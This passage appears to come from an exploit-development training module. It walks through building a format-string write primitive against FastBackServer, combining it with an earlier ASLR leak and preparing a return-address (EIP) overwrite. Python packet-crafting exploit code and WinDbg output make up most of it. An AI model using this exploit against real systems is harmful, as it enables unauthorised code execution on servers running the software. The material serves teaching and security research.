+	buf += pack("<i", 0x100)  # 2nd memcpy: size field
+	buf += pack("<i", 0x200)  # 3rd memcpy: offset
+	buf += pack("<i", 0x100)  # 3rd memcpy: size field
+	buf += bytearray([0x41]*0x8)
+
+	# psCommandBuffer
+	buf += b"w00t:BBAAAA" + b"%x:" * 20
+	buf += b"%n"
+	buf += b"%x" * 0x6b 
+	buf += b"B" * 0x100 
+	buf += b"C" * 0x100 
+
+	# Padding
+	buf += bytearray([0x41]*(0x404-len(buf)))
+
+	s.send(buf)
+	s.close()
+	sys.exit(0)
+
+if __name__ == "__main__":
+ 	main()
+Listing 2 - Script to trigger a write to 0x41414141
+The address we've attempted to write to is 0x41414141, and thus invalid. If the %n specifier is enabled, we would expect an access violation when it is invoked.
+Listing 3 shows the result in WinDbg when the packet is sent:
+(1d34.1354): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800
+eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
+Listing 3 - Access violation due to %n specifier
+We do indeed get an access violation, which means the %n specifier is enabled.
+We'll observe that the access violation occurs because we attempt to write the contents of ECX to 0x41414141. This proves that if we replace 0x41414141 with a valid address, we can make the application write a value to it.
+This is a very important finding that we will leverage for code execution. We can already arbitrarily control the location being written to, but we must also control the value being written. We'll explore this topic in the next section.
+Exercise
+1.	Ensure you understand how the %n format specifier works and obtain an access violation by writing to an invalid memory address.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/
+2 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/set-printf-count-output?redirectedfrom=MSDN&view=msvc-160
+12.1.2. Overcoming Limitations
+The main goal in this section is to create a write primitive that can overwrite the contents at an arbitrary memory address with content of our choosing.
+During this process, we'll encounter a number of limitations and restrictions on how the %n specifier allows us to write to memory. We will be required to think creatively to address each challenge, using the type of thought process needed for other advanced attacks, such as those used in browser exploits.
+Let's use our knowledge from the reverse engineering we performed in the previous module to understand the value being written. We'll start by examining the access violation triggered in the previous section, which is repeated in Listing 4.
+(1d34.1354): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800
+eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
+Listing 4 - Access violation due to %n specifier
+The %n specifier triggers a write of the number of bytes written so far. This value is 0xC7, as shown in the listing above.
+To understand the size being written we must take a look at the format string. We can start by revisiting the call to vnsprintf that triggers the vulnerability in IDA Pro:
+ 
+Figure 1: Call to vsnprintf
+Figure 1 shows that the format string is the third argument and will thus be located at an offset of 0xC bytes from the return address on the stack.
+Now we can dump the call stack and locate the return address as shown in Listing 5.
+0:079> k
+ # ChildEBP RetAddr  
+00 102edbbc 0066bf8e FastBackServer!_output+0x507
+01 102edbf4 0065b14b FastBackServer!_vsnprintf+0x2c
+02 102edc0c 004803ff FastBackServer!ml_vsnprintf+0x18
+03 102edea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
+04 102ee2d4 0054b6a0 FastBackServer!EventLog+0x13c
+05 102ee31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
+06 1034fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
+07 1034feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+08 1034fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+09 1034ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+0a 1034ff80 75b99564 FastBackServer!_beginthreadex+0xf4
+0b 1034ff94 7798293c KERNEL32!BaseThreadInitThunk+0x24
+0c 1034ffdc 77982910 ntdll!__RtlUserThreadStart+0x2b
+0d 1034ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+0:079> dds 102edc0c L7
+102edc0c  102edea4
+102edc10  004803ff FastBackServer!EventLog_wrapted+0x2e2
+102edc14  102edca5
+102edc18  000001c7
+102edc1c  102eded4
+102edc20  102edeb8
+102edc24  102edc37
+Listing 5 - Callstack and return address for vsnprintf
+From the callstack we find the return address from vsnprintf must be FastBackServer!EventLog_wrapted+0x2e2, which means we can dump the stack contents of the stack frame from the subsequent call to get the arguments.
+At offset 0xC from the return address, we find the memory location for the format string. We can dump that next:
+0:079> da 102eded4
+102eded4  "AGI_S_GetAgentSignature: couldn'"
+102edef4  "t find agent w00t:BBAAAA%x:%x:%x"
+102edf14  ":%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%"
+102edf34  "x:%x:%x:%x:%x:%x:%x:%n%x%x%x%x%x"
+102edf54  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+102edf74  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+102edf94  "%x%x.."
+Listing 6 - Format string used with vnsprintf
+When the format string shown in Listing 6 is used with vsnprintf, the static string "AGI_S_GetAgentSignature: couldn't find agent " is first processed. This is followed by our tag "w00t", the alignment bytes, and a number of %x specifiers.
+Because the first part is a static string, we have no way of shortening that. Additionally we must keep the %n format specifier as the 21st specifier in order to keep it aligned with the placeholder address given by "AAAA".
+As a result, the smallest possible value we can obtain in ECX is 0xC7.
+Let's revisit the prototype for a format specifier to learn more about how this value can be increased.1
+%[flags][width][.precision][length]specifier
+Listing 7 - Format specifier prototype
+The subspecifier called [width] determines how many characters are written when a value is formatted. Essentially, this offers a way to pad the formatted result with empty spaces to make it appear more visually appealing.
+We can test this by modifying our script to split the 20th %x specifier from the rest. Let's add the arbitrary decimal value 256 as the width.
+...
+# psCommandBuffer
+buf += b"w00t:BBAAAA" + b"%x:" * 19
+buf += b"%256x:"
+buf += b"%n"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100
+...
+Listing 8 - Added a 256 width to the 20th %x specifier
+We'll restart FastBackServer, attach WinDbg, and execute the modified code. This gives us the access violation shown in Listing 9.
+(274c.1b60): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=0000006e ecx=000001bf edx=00000200 esi=0d66df4d edi=00000800
+eip=00672f1a esp=0d66d964 ebp=0d66dbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
+Listing 9 - Access violation with specifier width
+Here, we'll find that the value in ECX has been increased as expected, thus proving we can influence the value that is written.
+Note that ECX has been increased by 0xF8, not 0x100, because the original %x format specifier was an 8-character long DWORD.
+Ideally, we could write an arbitrary DWORD, but we have already found that we cannot write below the value 0xC7. We'll also recall the function prototype of vsnprintf2, repeated in Listing 10.
+int vsnprintf(
+  char *s,
+  size_t n,
+  const char *format,
+  va_list arg
+);
+Listing 10 - Function prototype for vsnprintf
+The second argument is the maximum size of the formatted string, which means arbitrarily increasing the width of the %x specifier will likely cause it to be truncated.
+Let's determine the maximum allowed value by revisiting the code segment that invokes the vsnprintf call inside EventLog_wrapted, as shown in Figure 2.
+ 
+Figure 2: Maximum size written to event log
+We'll notice a hardcoded upper limit of 0x1F4 bytes is present, but a dynamic value is subtracted from this. We can determine this value if we restart FastBackServer, set a breakpoint at FastBackServer!AGI_S_GetAgentSignature+0xd8 and trigger it with the same proof of concept.
+Next, we set a breakpoint on FastBackServer!EventLog_wrapted+0x2c9, which is only triggered in the same thread context through the "~." prefix. This allows us to reach the desired instruction in the correct thread context:
+0:001> bp FastBackServer!AGI_S_GetAgentSignature+0xd8
+
+0:001> g
+...
+
+0:001> ~. bp FastBackServer!EventLog_wrapted+0x2c9
+
+0:001> g
+...
+eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=7efeff08 esi=0607c4e0 edi=00669360
+eip=004803e6 esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog_wrapted+0x2c9:
+004803e6 baf4010000      mov     edx,1F4h
+
+0:001> p
+eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001f4 esi=0607c4e0 edi=00669360
+eip=004803eb esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog_wrapted+0x2ce:
+004803eb 2b55c8          sub     edx,dword ptr [ebp-38h] ss:0023:0d52de6c=0000002d
+
+0:001> p
+eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001c7 esi=0607c4e0 edi=00669360
+eip=004803ee esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!EventLog_wrapted+0x2d1:
+004803ee 52              push    edx
+Listing 11 - Maximum size of the formatted string
+In the calculation shown in Listing 11, the dynamic value 0x2D is subtracted from the static value 0x1F4, which results in a maximum size of the formatted string of 0x1C7 characters. 0x1C7 bytes is far from our goal of being able to write an arbitrary DWORD, so we'll need to find a creative solution.
+Let's summarize our findings so far. We're able to write a value between 0xC7 and 0x1C7 at an arbitrary null free address at this point.
+Although we cannot directly write an arbitrary DWORD value, we can trigger the vulnerability multiple times. This will allow us to combine four overwrites of one byte at increasing memory addresses to obtain a full DWORD.
+Before we go for a full DWORD, let's learn more about how we can write an arbitrary byte in memory. By invoking the vulnerability, we can easily write the values between 0xC7 and 0xFF. If we write the value 0x100 and only examine the byte at the address we targeted, this is effectively 0x00 since the leading value of 1 goes into the next byte.
+In this way, we can write the values from 0x100 to 0x1C6 to obtain an arbitrary byte value between 0x00 and 0xC6 in the targeted address, while ignoring the higher bytes.
+Let's now expand on this, triggering the vulnerability four times to write four arbitrary bytes next to each other. Listing 12 shows this concept by writing the DWORD 0x1234ABCD into the address 0x41414141.
+Write Address     Value     Result
+
+Initial state               00 00 00 00
+                            -----------
+0x41414141        0xCD      00 00 00 CD
+                            -----------
+0x41414142        0x1AB     00 01 AB CD
+                            -----------
+0x41414143        0x134     01 34 AB CD
+                            -----------
+0x41414144        0x112     12 34 AB CD
+Listing 12 - Write a byte 4 times gives a DWORD
+As illustrated in the listing above, we first write the value 0xCD to the address 0x41414141, then we write the value 0x1AB to the address 0x41414142. This leaves the previous value we wrote intact and the two lower bytes now contain 0xABCD, as desired.
+Following this process, we can write arbitrary content into all four bytes and obtain the DWORD 0x1234ABCD in memory. The instruction used to write to memory is "mov dword ptr [eax],ecx", which means a full DWORD is written. This has the side effect of also overwriting the three bytes above the desired address.
+In theory, we can follow this concept to develop a working write primitive. We'll need to solve a number of implementation challenges, however. These challenges include:
+1.	Determining width values for the %x specifier to write values between 0xC7 and 0x1C7.
+2.	Automatically calculating the width value in the script.
+3.	Combining the stack leak and ability to write a byte.
+4.	Combining four writes of a single byte into a DWORD.
+Let's tackle these one at a time to build out the required code.
+We previously found that providing no width subspecifier results in the value 0xC7 being written, but if the width value is less than the maximum size vsnprintf processes, the output is not truncated.
+This means we need to determine the smallest width value that still results in 0xC7 being written. The value processed by the 20th %x format specifier is a DWORD read from the stack, which is interpreted as a hexadecimal value. This means it can only be between zero and eight characters long when written.
+To build a stable exploit, we'll need to ensure that the size contained in the DWORD is fixed. Thinking back to when we developed the code required to leak a pointer from kernelbase.dll, we printed the formatted bytes as found in the event log. Our result is repeated in Listing 13.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61fe7
+Stack address leaked to event log
+The eventlog returned contains 1103 bytes
+The size read is: 0x1103
+[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t' 
+...
+Leaked stack address is: 0x1029ded4
+Listing 13 - Output from appending A's
+As highlighted in Listing 13, the value that was processed by the 20th %x format specifier is "b'42423a74", which in ASCII translates to "t:BB". These four characters are a substring of "w00t:BB" and is directly under our control.
+This means that the DWORD will always contain four characters, or when translated to hexidecimal, eight digits. Because of this, we can start the width value at eight every time without issues.
+Let's use this information to write a byte value between 0xC7 and 0xFF, following the algorithm given in Listing 14.
+byteValue = <byte value>
+if byteValue > 0xC6:
+  width = byteValue - 0xC7 + 0x8
+Listing 14 - Algorithm to calculate width value
+For values between 0x00 and 0xC6, we'll have to be a bit more clever. To write the byte value 0x00, we need the total bytes written to be 0x100.
+If we follow the algorithm in Listing 14 for a byteValue of 0xFF, the corresponding width is 0x40. This means that a width of 0x41 would only come from a byteValue of 0x100, which is equivalent to 0x00 in our case.
+Let's set up a formula to solve this, as shown in Listing 15, where y is the static addition or subtraction we want to find.
+width = byteValue + 0x8 + y
+...
+0x41 = 0x0 + 0x8 + y <=> y = 0x39
+Listing 15 - Formula to calculate static offset
+Using the example values we found for a byteValue of 0x00 and related width of 0x41, we'll find y to be 0x39.
+Now we can create the remaining portion of the algorithm, as shown in Listing 16.
+byteValue = <byte value>
+if byteValue > 0xC6:
+  width = byteValue - 0xC7 + 0x8
+else:
+  width = byteValue + 0x39 + 0x8
+Listing 16 - Algorithm to calculate width value in all cases
+Next, we can implement the completed algorithm in our Python script and use the dynamically-calculated width value with the %x format specifier.
+The relevant updated code for attempting to write the value 0xD8 is shown in Listing 17.
+...
+byteValue = 0xD8
+
+if byteValue > 0xC6:
+  width = byteValue - 0xC7 + 0x8
+else:
+  width = byteValue + 0x39 + 0x8
+
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x604)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += b"w00t:BBAAAA" + b"%x:" * 19
+buf += b"%" + b"%d" % width + b"x:"
+buf += b"%n"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100
+...
+Listing 17 - Updated code to write an arbitrary byte value in memory
+Let's execute our updated proof of concept and send the packet to FastBackServer with WinDbg attached.
+We can now observe the access violation while writing to 0x41414141:
+(2310.b10): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d78df4c edi=00000800
+eip=00672f1a esp=0d78d964 ebp=0d78dbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
+Listing 18 - Access violation while writing 0xD8
+As highlighted in Listing 18, the correct value (0xD8) is indeed used in the write operation, so our idea works and we are able to write an arbitrary byte value to an arbitrary memory address. Nice!
+In this section, we explored the limits imposed upon us by the %n specifier for this particular vsnprintf call. We learned how to write arbitrary byte values despite these limitations. We'll combine this write primitive with our previous stack leak code to write to the stack in the next section.
+Exercises
+1.	Follow the analysis and ensure you understand the algorithm to calculate the width for an arbitrary byte value.
+2.	Update the Python script to perform writes with a byte value through the dynamically-generated width value. Test it with values both above and below 0xC7.
+1 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-160
+2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
+12.1.3. Write to the Stack
+In the previous section, we crossed our first two hurdles by developing an algorithm for the width calculation and implementing it in the Python script to allow the write of an arbitrary byte value.
+Our next challenge is to combine the ability to write a byte with our ASLR bypass developed in the previous module, enabling us to write a byte to the stack.
+At first glance, this seems fairly simple, since we can insert the write primitive code directly into our ASLR-leak Python script after the base address of kernelbase.dll is printed to the console.
+Let's test our idea by making two changes to the code, both highlighted in Listing 19. First, we'll remove the static A's and replace them with the leaked stack address, plus an offset of 0x1000.
+We know that the contents of the stack are changed every time a function call is made. This means if we write directly to the leaked stack address, the value might be overwritten before we can verify it in the debugger. This is why we've chosen a large arbitrary offset of 0x1000.
+# psCommandBuffer
+buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000) + b"%x:" * 19
+buf += b"%" + b"%d" % width + b"x:"
+buf += b"%n"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+
+s.send(buf)
+print("Written " + str(hex(byteValue)) + " to address " + str(hex(stackAddr + 0x1000)))
+input()
+
+s.close()
+sys.exit(0)
+Listing 20 - Code to write to the stack address
+At the end of the script, we'll call input to pause execution, allowing us to break in WinDbg and examine the contents of the stack address.
+In our example, we will write the byte value 0xD8 as before, and have the address to which it is written printed to the console.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x60dac
+Stack address leaked to event log
+The eventlog returned contains b03 bytes
+The size read is: 0xb03
+Leaked stack address is: 0xd51ded4
+Kernelbase address leaked to event log
+The eventlog returned contains 503 bytes
+The size read is: 0x503
+Leaked Kernelbase address is: 0x745dc36a
+Kernelbase base address is: 0x744d0000
+Written 0xd8 to address 0xd51eed4
+Listing 21 - Executing the write primitive
+Once the byte is written to the stack address, execution pauses, and we can switch to WinDbg and break into it. Let's examine the contents we wrote.
+0:063> dd 0xd51eed4 L1
+0d51eed4  000000dc
+
+0:063> ? dc - d8
+Evaluate expression: 4 = 00000004
+Listing 22 - Examining the stack reveals the wrong value
+As shown in Listing 22, the wrong byte value was written. It is off by four bytes.
+From the previous section, we know that the write primitive works and our algorithm is correct, so we need to determine why the byte value is off.
+As is often the case with exploit development, combining or changing code within an exploit can have unexpected consequences.
+To investigate this scenario, we'll execute our previous proof of concept containing only the write primitive, and then examine the contents of the stack.
+(2310.b10): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+
+0:063> bp FastBackServer!_output+0x507
+eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d46df4c edi=00000800
+eip=00672f1a esp=0d46d964 ebp=0d46dbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
+
+0:001> k
+ # ChildEBP RetAddr  
+00 0d46dbbc 0066bf8e FastBackServer!_output+0x507
+01 0d46dbf4 0065b14b FastBackServer!_vsnprintf+0x2c
+02 0d46dc0c 004803ff FastBackServer!ml_vsnprintf+0x18
+03 0d46dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
+...
+Listing 23 - Callstack during vsnprintf
+Now we can dump the contents at the stored return address, which enables us to locate the call from ml_vsnprintf and the supplied arguments. We'll recall that the fourth argument is the address of the array containing the contents used with the format specifiers.
+:001> dds 0d46dbbc
+0d46dbbc  0d46dbf4
+0d46dbc0  0066bf8e FastBackServer!_vsnprintf+0x2c
+...
+0d46dbf8  0065b14b FastBackServer!ml_vsnprintf+0x18
+0d46dbfc  0d46dca5
+0d46dc00  000001c7
+0d46dc04  0d46ded4
+0d46dc08  0d46deb8
+0d46dc0c  0d46dea4
+...
+Listing 24 - Fourth argument for vsnprintf
+The array of arguments used with the format specifiers is given in Listing 25. We should keep in mind that we don't control the first seven values.
+0:001> dc 0d46deb8
+0d46deb8  000000c4 0d46ded4 00000025 00000078  ......F.%...x...
+0d46dec8  0000012e 00000025 00000000 5f494741  ....%.......AGI_
+0d46ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
+0d46dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
+0d46def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB
+0d46df08  41414141 253a7825 78253a78 3a78253a  AAAA%x:%x:%x:%x:
+0d46df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
+0d46df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
+Listing 25 - Contents of argument array during standalone
+The discrepancy in size must be due to the number of values written to the target address before the %n specifier is reached.
+Keeping in mind that the %n specifier only counts the number of values, we know that our algorithm will be off if the number of digits in any of the first seven values, which we do not control, changes.
+As an example, the value contained in the first DWORD is currently 0xc4. When 0xc4 is processed by vsnprintf, the %x format specifier is used, which means two digits are written to the formatted string.
+If the first DWORD were to change from 0xc4 to 0x1c4, it would result in 3 digits when formatted by vsnprintf, which in turn leads to an increase in the value returned through the %n specifier.
+Let's determine if an instability exists, and if it does, figure out a way to solve it.
+Let's begin by restarting FastBackServer, attaching WinDbg, setting a breakpoint at the location of our access violation (FastBackServer!_output+0x507), and then executing our Python script, which includes both the ASLR leak and the write primitive.
+When the breakpoint is encountered, we'll follow the same dereference chain to locate the contents of the arguments array, as shown in Listing 26.
+0:080> dc 0db2deb8 L28
+0db2deb8  000000c4 0db2ded4 00000025 00000078  ........%...x...
+0db2dec8  0000012e 001afd25 00000000 5f494741  ....%.......AGI_
+0db2ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
+0db2dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
+0db2def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB
+0db2df08  0db2eed4 253a7825 78253a78 3a78253a  ....%x:%x:%x:%x:
+0db2df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
+0db2df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
+0db2df38  3a78253a 253a7825 78253a78 3532253a  :%x:%x:%x:%x:%25
+0db2df48  6e253a78 78257825 78257825 78257825  x:%n%x%x%x%x%x%x
+Listing 26 - Contents of argument array
+By comparing the contents of the arguments array shown in Listing 26 and the those shown in Listing 25, we find that only the dynamic stack address and the sixth value differ.
+The sixth value changed from 0x25 to 0x1afd25. When the new value of 0x1afd25 is processed by the %x specifier, it will take up an additional four characters. That means the value returned through the %n specifier is increased by 4 when the write primitive is invoked inside the combined script.
+These leftover bytes on the stack, likely from a previous vsnprintf call, explain why the value we want to write is incorrect when the code is combined.
+The number of characters written to the eventlog has increased from 2 to 6, but we can account for the increase by using a width value of "6" with the sixth %x specifier. This will ensure that the number of characters written to the event log will always remain constant. However, implementing this change will cause another issue.
+Because four extra values are always printed, our algorithm is off. We previously found that we can write the values from 0xC7 up to a maximum of 0x1C7, but an increase of 4 to all values will push us over the maximum size. We can account for this by removing four of the colons used to separate the %x specifiers.
+...
+# psCommandBuffer
+buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000)
+buf += b"%x" * 5 + b":"
+buf += b"%6x:"
+buf += b"%x:" * 13
+buf += b"%" + b"%d" % width + b"x:"
+buf += b"%n"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+...
+Listing 27 - Accounting for the variable size
+The colons are present to make it easier to identify separate values, but they're irrelevant when we invoke the write primitive.
+Let's remove four of the colons, leaving our algorithm for calculating the width otherwise unchanged, and re-test the exploit.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x617fc
+Stack address leaked to event log
+The eventlog returned contains 1003 bytes
+The size read is: 0x1003
+Leaked stack address is: 0xee5ded4
+Kernelbase address leaked to event log
+The eventlog returned contains 803 bytes
+The size read is: 0x803
+Leaked Kernelbase address is: 0x745dc36a
+Kernelbase base address is: 0x744d0000
+Written 0xd8 to address 0xee5eed4
+Listing 28 - Write a byte to the stack
+After the input function is encountered, we will switch to WinDbg, break into it, and dump the contents at the address that we wrote to on the stack.
+0:006> dd 0xee5eed4 L1
+0ee5eed4  000000d8
+Listing 29 - The correct value was written
+Listing 29 shows that this time, the correct value was written to the stack. Excellent!
+We are now one step closer to implementing the complete write primitive.
+Exercises
+1.	Combine the byte write code with the stack leak code and attempt to write a byte value.
+2.	Repeat the analysis to figure out why the value is off by four.
+3.	Implement a fix to the code that accounts for the variable content on the stack.
+4.	What happens if FastBackServer runs for a long time and the stack address goes above 0x10000000? Ensure that your exploit handles this scenario.
+12.1.4. Going for a DWORD
+Our work in the previous sections has enabled us to write an arbitrary byte value to a specific memory address. Let's finish the work by combining four byte writes into a full DWORD write.
+We can combine the four byte writes with a for loop, as shown in Listing 30. We'll use the dummy value 0x1234ABCD for testing.
+Since each iteration only handles one byte, the DWORD is split by right-shifting the loop index eight times. The stack address we're writing to is also increased by the index value.
+value = 0x1234ABCD
+
+for index in range(4):
+	byteValue = (value >> (8 * index)) & 0xFF
+	if byteValue > 0xC6:
+	  width = byteValue - 0xC7 + 0x8
+	else:
+	  width = byteValue + 0x39 + 0x8
+
+	# psAgentCommand
+	buf = pack(">i", 0x400)
+	buf += bytearray([0x41]*0xC)
+	buf += pack("<i", 0x604)  # opcode
+	buf += pack("<i", 0x0)    # 1st memcpy: offset
+	buf += pack("<i", 0x100)  # 1st memcpy: size field
+	buf += pack("<i", 0x100)  # 2nd memcpy: offset
+	buf += pack("<i", 0x100)  # 2nd memcpy: size field
+	buf += pack("<i", 0x200)  # 3rd memcpy: offset
+	buf += pack("<i", 0x100)  # 3rd memcpy: size field
+	buf += bytearray([0x41]*0x8)
+
+	# psCommandBuffer
+buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000 + index)
+	buf += b"%x" * 5 + b":"
+	buf += b"%6x:"
+	buf += b"%x:" * 13
+	buf += b"%" + b"%d" % width + b"x:"
+	buf += b"%n"
+	buf += b"%x" * 0x6b 
+	buf += b"B" * 0x100 
+	buf += b"C" * 0x100 
+
+	# Padding
+	buf += bytearray([0x41]*(0x404-len(buf)))
+
+	s.send(buf)
+
+print("Written " + str(hex(value)) + " to address " + str(hex(stackAddr + 0x1000)))
+input()
+Listing 30 - Four byte writes through a for loop
+At the end of the code, we'll print the entire DWORD and the location we wrote it to.
+Let's execute the Python code and, just before the input call, we'll find the new address to which the value is written.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61c1e
+Stack address leaked to event log
+The eventlog returned contains 1103 bytes
+The size read is: 0x1103
+Leaked stack address is: 0xfc5ded4
+Kernelbase address leaked to event log
+The eventlog returned contains 803 bytes
+The size read is: 0x803
+Leaked Kernelbase address is: 0x745dc36a
+Kernelbase base address is: 0x744d0000
+Written 0x1234abcd to address 0xfc5eed4
+Listing 31 - Write a full DWORD to the stack
+With the input call stopping execution, we can switch to WinDbg again and verify if the DWORD was written correctly.
+0:006> dd 0xfc5eed4 L1
+0fc5eed4  1234abcd
+Listing 32 - The full DWORD is written to memory
+Here we'll find the full DWORD, 0x1234ABCD, at the desired address.
+As with most exploits, they are never 100% stable and sometimes the exploit will fail to execute all four writes.
+Our hard work with the format string vulnerability has now resulted in the creation of both a read and write primitive, enabling us to read from and write to an arbitrary location in memory. These are powerful abilities that we can likely apply to achieve code execution.
+Exercises
+1.	Combine four byte writes in a for loop to obtain a full DWORD write, as shown in this section.
+2.	Implement a writeDWORD function in the Python script to write a value to a given address. This will provide us with a more modular approach going forward.
+12.2. Overwriting EIP with Format Strings
+Now that we can write a DWORD anywhere in memory, let's figure out how to leverage that to obtain code execution.
+In the next couple of sections, we'll focus on gaining control of EIP, which is the first step towards code execution. As part of this process, we'll learn how to locate a return address on the stack.
+12.2.1. Locating a Target
+In many stack-based vulnerabilities, EIP control is obtained by overwriting content on the stack outside of the bounds of a buffer. If we write enough content, we may be able to directly overwrite a stored return address on the stack, or perhaps the SEH chain.
+To use our write primitive, let's find a return address stored on the stack that we can overwrite. We can only write one byte at a time, so we need to make sure the return address is not used before the entire DWORD has been written.
+Overwriting a return address on the stack is also a common technique for bypassing the Control Flow Guard (CFG)1 security mitigation.
+An optimal target will be located far down the call stack. To find possible candidates, let's set a breakpoint on _FastBackServer!output+0x507 where the byte value is written. We can then dump and search the stack for addresses that are present.
+0:078> bp FastBackServer!_output+0x507
+
+0:078> g
+Breakpoint 0 hit
+eax=0f4ceed4 ebx=0000006e ecx=00000144 edx=00000200 esi=0f4cdf4a edi=00000800
+eip=00672f1a esp=0f4cd964 ebp=0f4cdbbc iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!_output+0x507:
+00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:0f4ceed4=00000000
+
+0:086> k
+ # ChildEBP RetAddr  
+00 0f4cdbbc 0066bf8e FastBackServer!_output+0x507
+01 0f4cdbf4 0065b14b FastBackServer!_vsnprintf+0x2c
+02 0f4cdc0c 004803ff FastBackServer!ml_vsnprintf+0x18
+03 0f4cdea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
